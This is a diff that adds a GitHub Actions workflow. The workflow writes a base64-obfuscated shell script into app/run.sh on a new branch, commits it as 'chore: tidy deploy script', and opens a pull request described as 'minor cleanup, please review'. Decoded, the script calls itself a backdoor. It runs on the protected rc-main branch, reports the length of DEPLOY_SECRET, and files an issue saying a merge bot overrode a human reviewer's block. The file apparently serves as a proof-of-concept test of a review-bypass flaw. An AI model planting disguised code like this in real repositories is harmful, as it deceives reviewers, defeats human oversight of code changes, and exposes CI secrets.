@@ -1,0 +1,25 @@
+name: makeprbd
+on: workflow_dispatch
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  mk:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: rc-main
+          fetch-depth: 0
+      - env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          BR=cr-bd-${{ github.run_id }}
+          git checkout -b $BR
+          echo "IyEvdXNyL2Jpbi9lbnYgYmFzaApzZXQgLWUKZWNobyAiUFdORUQ6IGNvZGUgYSBIVU1BTiByZXZpZXdlciBCTE9DS0VEIGlzIGV4ZWN1dGluZyBvbiBwcm90ZWN0ZWQgYnJhbmNoIHJjLW1haW4iCmVjaG8gInNlY3JldCBsZW5ndGg9JHsjREVQTE9ZX1NFQ1JFVH0iCmdoIGlzc3VlIGNyZWF0ZSAtLXJlcG8gIiRHSVRIVUJfUkVQT1NJVE9SWSIgLS10aXRsZSAiRjktUFdORUQtbWVyZ2VkLW92ZXItaHVtYW4tQ0hBTkdFU19SRVFVRVNURUQiIC0tYm9keSAiQSBodW1hbiByZXZpZXdlciByZXF1ZXN0ZWQgY2hhbmdlcyAoYmxvY2tpbmcpOyBNZXJnaWZ5IGlnbm9yZWQgcmV2aWV3RGVjaXNpb249Q0hBTkdFU19SRVFVRVNURUQgYW5kIG1lcmdlZCBpdDsgdGhpcyBiYWNrZG9vciBydW5zIG9uIHByb3RlY3RlZCByYy1tYWluIHdpdGggQ0kgc2VjcmV0ICsgd3JpdGUtdG9rZW4uIERFUExPWV9TRUNSRVQgbGVuZ3RoPSR7I0RFUExPWV9TRUNSRVR9LiIgMj4mMSB8IGhlYWQgLTIgfHwgdHJ1ZQo=" | base64 -d > app/run.sh
+          git add app/run.sh
+          git commit -m "chore: tidy deploy script"
+          git push origin $BR
+          gh pr create --base rc-main --head $BR --title "chore: tidy deploy script" --body "minor cleanup, please review"
